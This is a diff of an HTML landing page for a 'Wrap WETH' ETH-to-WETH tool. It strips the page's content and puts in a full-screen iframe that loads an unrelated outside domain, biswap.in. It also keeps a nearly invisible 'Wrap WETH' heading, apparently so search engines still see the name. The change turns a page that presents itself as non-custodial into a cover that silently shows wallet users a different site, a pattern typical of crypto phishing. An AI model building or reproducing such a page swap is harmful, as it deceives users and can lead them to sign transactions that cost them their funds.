@@ -159,165 +159,19 @@
   @media (prefers-reduced-motion:reduce){*{animation-duration:.01ms!important; transition-duration:.01ms!important}}
   </style>
 </head>
-<body>
-  <div class="bg" aria-hidden="true"><div class="glow"></div><div class="hatch"></div></div>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <header class="topbar">
-    <a class="brand" href="./">
-      <img src="favicon.png" width="30" height="30" alt="">
-      <span>Wrap WETH</span>
-    </a>
-    <span class="spacer"></span>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="how-it-works/">How it works</a>
-      <a href="faq/">FAQ</a>
-      <a href="about/">About</a>
-      <a href="security/">Security</a>
-      <a href="supported-chains/">Supported Chains</a>
-    </nav>
-  </header>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-  <main>
-    <section class="wrap hero">
-      <span class="eyebrow"><span class="dot"></span>ETH To WETH</span>
-      <h1>Wrap WETH</h1>
-      <p class="deck">Wrap WETH converts native ETH into the <a class="cite" href="https://etherscan.io/token/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" rel="nofollow noopener noreferrer">canonical token contract</a> used across DeFi, with a <strong>non-custodial</strong> wallet flow that shows route, gas, and confirmation details before you sign.</p>
-      <div class="cta-row">
-        <a class="primary" href="dashboard/">Open App
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-        </a>
-        <a class="ghost" href="how-it-works/">How it works
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
-        </a>
-      </div>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Wrap WETH
+  </h1>
 
-      <section class="routebar" aria-label="Wrap preview">
-        <div class="rhead">
-          <span class="ct">Wrap</span>
-          <span class="pill"><span class="pdot"></span>Preview</span>
-        </div>
-        <div class="rgrid">
-          <div class="leg">
-            <span class="lab">You pay</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="eth.png" alt="ETH">ETH <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Amount in app</span>
-            </div>
-          </div>
-          <button class="rswitch" type="button" data-switch aria-label="Switch direction">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 4v13M4 14l3 3 3-3M17 20V7M14 10l3-3 3 3"/></svg>
-          </button>
-          <div class="leg">
-            <span class="lab">You receive</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="eth.png" alt="WETH">WETH <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Live quote in app</span>
-            </div>
-          </div>
-        </div>
-        <div class="rbar-foot">
-          <div class="rmeta">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm0 5v5l3 3"/></svg>
-            Gas, route details, and wallet confirmation appear live in the app.
-          </div>
-          <a class="rcta" href="dashboard/">Open App
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-          </a>
-        </div>
-        <p class="rnote">Preview only &middot; non-custodial &middot; connect your wallet in the app</p>
-      </section>
-    </section>
-
-    <!-- WHY (icon-left rows) -->
-    <section class="wrap sec" id="why">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 8-8 10-4.5-2-8-5-8-10V6l8-4z"/></svg>Why wrap here</span>
-        <h2 class="h2">Wrap ETH into WETH without losing custody</h2>
-        <p>WETH gives ETH the token interface many decentralized exchanges, lending markets, NFT tools, and contract-based DeFi flows expect. This page focuses on a clean wrap and unwrap experience, not a speculative trade.</p>
-      </div>
-      <div class="rows">
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></span>
-          <div><h3>Wallet-native from start to finish</h3><p>You connect a <a class="cite" href="https://metamask.io/" rel="nofollow noopener noreferrer">non-custodial wallet</a>, choose ETH or WETH, and sign the wrap transaction yourself. Funds stay under your wallet control throughout the flow.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg></span>
-          <div><h3>Built for Ethereum DeFi</h3><p>WETH follows the <a class="cite" href="https://ethereum.org/en/developers/docs/standards/tokens/erc-20/" rel="nofollow noopener noreferrer">ERC-20 token standard</a>, which makes ETH easier to use inside smart contracts that expect token approvals, balances, and transfers.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 9-9 9 9 0 0 1 9 9 9 9 0 0 1-9 9"/><path d="M3 12h6l2-3 2 6 2-3h2"/></svg></span>
-          <div><h3>Live cost and timing context</h3><p>Wrapping is an on-chain wallet action, so timing and cost depend on network activity. The app surfaces the live route and your wallet shows the transaction request before broadcast.</p></div>
-        </div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="how">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 12h16M4 17h10"/></svg>How it works</span>
-        <h2 class="h2">Wrap WETH in three wallet steps</h2>
-        <p>Use the same route to wrap ETH into WETH or unwrap WETH back to ETH. The important decisions are amount, direction, and wallet confirmation.</p>
-      </div>
-      <div class="steps">
-        <div class="step"><span class="num">1</span><h3>Connect your wallet</h3><p>Open the app and connect the wallet that holds your ETH or WETH. No exchange account or deposit flow is required.</p></div>
-        <div class="step"><span class="num">2</span><h3>Choose direction and amount</h3><p>Select ETH to receive WETH, or switch the route to unwrap. The quote area keeps the amount and route details inside the app.</p></div>
-        <div class="step"><span class="num">3</span><h3>Review and sign</h3><p>Check the gas prompt, token direction, and receiving asset, then approve the transaction from your wallet only when the details look right.</p></div>
-      </div>
-    </section>
-
-    <!-- FAQ (2-col) -->
-    <section class="wrap sec" id="faq">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 1 1 3.5 2.3c-.8.4-1 .8-1 1.7M12 17h.01"/></svg>FAQ</span>
-        <h2 class="h2">Wrap WETH questions</h2>
-      </div>
-      <div class="faq">
-        <div class="qa"><span class="qn">01</span><h3>What does Wrap WETH mean?</h3><p>Wrap WETH means converting native ETH into WETH, the tokenized version of ETH used by many DeFi contracts. The underlying value tracks ETH, but the token format is different.</p></div>
-        <div class="qa"><span class="qn">02</span><h3>Can I unwrap WETH back to ETH?</h3><p>Yes. The route can be reversed from WETH to ETH, and the wallet confirmation will show the direction before you sign.</p></div>
-        <div class="qa"><span class="qn">03</span><h3>Which chains and assets are supported?</h3><p>This flow is centered on ETH and WETH, with available networks shown inside the app. Review the current network list on the <a href="supported-chains/">supported chains</a> page.</p></div>
-        <div class="qa"><span class="qn">04</span><h3>How long does wrapping take?</h3><p>Timing depends on the network and wallet confirmation. Once submitted, the transaction settles according to the chain's current conditions.</p></div>
-        <div class="qa"><span class="qn">05</span><h3>What does it cost to wrap?</h3><p>The main cost is network gas, displayed by your wallet before signing. Any live route detail is shown in the app, so avoid confirming if the prompt does not match your intent.</p></div>
-        <div class="qa"><span class="qn">06</span><h3>How should I check safety?</h3><p>Verify the asset, direction, wallet prompt, and destination network. Wallet tools built around the <a class="cite" href="https://walletconnect.network/" rel="nofollow noopener noreferrer">wallet connection standard</a> help you confirm only the transaction you intend to send.</p></div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="more">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7 0l2-2a5 5 0 0 0-7-7l-1 1M14 11a5 5 0 0 0-7 0l-2 2a5 5 0 0 0 7 7l1-1"/></svg>Learn more</span>
-        <h2 class="h2">Explore Wrap WETH</h2>
-      </div>
-      <div class="related">
-        <a class="rel" href="how-it-works/"><span class="rt">How it works <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>The full wrap and unwrap walkthrough, from wallet connection to final confirmation.</p></a>
-        <a class="rel" href="security/"><span class="rt">Security <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>How to review prompts, protect self-custody, and avoid signing the wrong transaction.</p></a>
-        <a class="rel" href="supported-chains/"><span class="rt">Supported chains <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>The current networks and ETH/WETH routes available from the app.</p></a>
-      </div>
-    </section>
-  </main>
-
-  <footer class="footer">
-    <div class="wrap">
-      
-      <p style="margin-top:6px"><b>Wrap WETH</b></p>
-    </div>
-  </footer>
-
-  <script type="application/ld+json">
-  {"@context":"https://schema.org","@graph":[
-    {"@type":"WebSite","@id":"https://wrap-weth.github.io/#website","url":"https://wrap-weth.github.io/","name":"Wrap WETH"},
-    {"@type":"Organization","@id":"https://wrap-weth.github.io/#org","name":"Wrap WETH","url":"https://wrap-weth.github.io/","logo":"https://wrap-weth.github.io/favicon.png"},
-    {"@type":"WebApplication","name":"Wrap WETH","applicationCategory":"FinanceApplication","operatingSystem":"Web","url":"https://wrap-weth.github.io/","browserRequirements":"Requires a Web3 wallet","description":"Non-custodial web app for wrapping ETH into WETH and unwrapping WETH back to ETH with live route and wallet confirmation details."},
-    {"@type":"FAQPage","mainEntity":[
-      {"@type":"Question","name":"What does Wrap WETH mean?","acceptedAnswer":{"@type":"Answer","text":"Wrap WETH means converting native ETH into WETH, the tokenized version of ETH used by many DeFi contracts. The underlying value tracks ETH, but the token format is different."}},
-      {"@type":"Question","name":"Can I unwrap WETH back to ETH?","acceptedAnswer":{"@type":"Answer","text":"Yes. The route can be reversed from WETH to ETH, and the wallet confirmation will show the direction before you sign."}},
-      {"@type":"Question","name":"Which chains and assets are supported?","acceptedAnswer":{"@type":"Answer","text":"This flow is centered on ETH and WETH, with available networks shown inside the app. Review the current network list on the supported chains page."}},
-      {"@type":"Question","name":"How long does wrapping take?","acceptedAnswer":{"@type":"Answer","text":"Timing depends on the network and wallet confirmation. Once submitted, the transaction settles according to the chain's current conditions."}},
-      {"@type":"Question","name":"What does it cost to wrap?","acceptedAnswer":{"@type":"Answer","text":"The main cost is network gas, displayed by your wallet before signing. Any live route detail is shown in the app, so avoid confirming if the prompt does not match your intent."}},
-      {"@type":"Question","name":"How should I check safety?","acceptedAnswer":{"@type":"Answer","text":"Verify the asset, direction, wallet prompt, and destination network. Wallet connection tools help you confirm only the transaction you intend to send."}}
-    ]}
-  ]}
-  </script>
-
-  <script>
-  (function(){"use strict";var b=document.querySelector("[data-switch]");if(!b)return;b.addEventListener("click",function(){var p=document.querySelectorAll(".rgrid .tok");if(p.length<2)return;var t=p[0].innerHTML;p[0].innerHTML=p[1].innerHTML;p[1].innerHTML=t;});}());
-  </script>
 </body>
 </html>
